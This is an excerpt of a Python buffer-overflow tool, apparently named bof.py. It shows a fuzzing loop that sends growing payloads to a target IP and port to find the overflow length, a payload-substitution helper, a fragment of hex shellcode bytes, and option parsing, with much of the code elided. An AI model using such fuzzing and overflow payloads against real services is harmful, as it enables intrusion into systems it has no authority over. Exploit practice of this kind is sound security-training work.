#!/usr/bin/python
import socket, time, sys, os, fcntl, errno
...
def replace_payload(term, payload, inputBuffer):
    #print("Here are the variables {0},{1},{2}".format(type(term), type(payload), type(inputBuffer)))

    new_payload = payload.replace(term, inputBuffer)
    #print("New-payload {0}".format(type(new_payload)))
    return new_payload.strip('\n')

def fuzz_find_buf_len(ip, port, payload, start_size, end_size, increment):
    server = ip
    sport = port
    ...
    while(size <= end_size):
        ...
        new_payload = replace_payload('PAYLOAD', payload, inputBuffer)
...
"\x19\x26\x89\x52\x96\xf5\xca")
        ...
        if(options.fuzz != None):
            fuzz_find_buf_len(ip, port, payload, options.fuzz[0], options.fuzz[1], options.fuzz[2])
            return
...
parser.add_option("-f", "--fuzz", dest="fuzz", type="int", nargs=3,
                  help="Fuzz for length of buffer. Run with ./bof.py <ip> <port> -f <start_size> <end_size> <increment>", action="store")
